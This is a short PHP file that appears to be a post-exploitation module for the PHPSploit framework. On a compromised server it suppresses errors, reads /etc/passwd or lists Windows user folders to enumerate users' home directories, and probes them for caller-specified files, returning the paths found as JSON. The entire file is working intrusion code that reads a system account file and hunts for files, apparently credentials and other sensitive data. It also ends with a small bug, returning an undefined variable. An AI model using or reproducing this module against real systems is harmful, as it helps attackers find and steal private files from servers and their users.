<?php
error_reporting(0);

$user = $PHPSPLOIT['USER'];

if ($user === "any") {
    if (stat("C:\\Users")) {
        $directories = glob('C:\\Users' . '\*' , GLOB_ONLYDIR);        
    } else {
        $directories = array();
        $passwd = file_get_contents("/etc/passwd");
        $passwd = explode ( "\n", $passwd );
        for ($i = 0; $i < count($passwd); $i++):
            $line = explode ( ":", $passwd[$i] );
            if (preg_match("/sh$/", $line[6])) {
                $directories[] = $line[5];
            }
        endfor;
    }
} else {
    if (stat("C:\Users")) {
        $directories = Array("C:\\Users\\" . $user);    
    } else {
        $passwd = file_get_contents("/etc/passwd");
        $passwd = explode ( "\n", $passwd );
        for ($i = 0; $i < count($passwd); $i++):
            $line = explode ( ":", $passwd[$i] );
            if ($line[0] === $user) {
                $directories = Array($line[5]);
                break;
            }
        endfor;
    }
}

$results = array();
foreach($PHPSPLOIT['SEARCH_FOR'] as $filename) {
    foreach($directories as $dir) {
        $fullpath = $dir . "/" . $filename;
        if (file_exists($fullpath)) {
            $results[] = $fullpath;
        }
    }
}
print_r(json_encode($results));
return $result;
?>
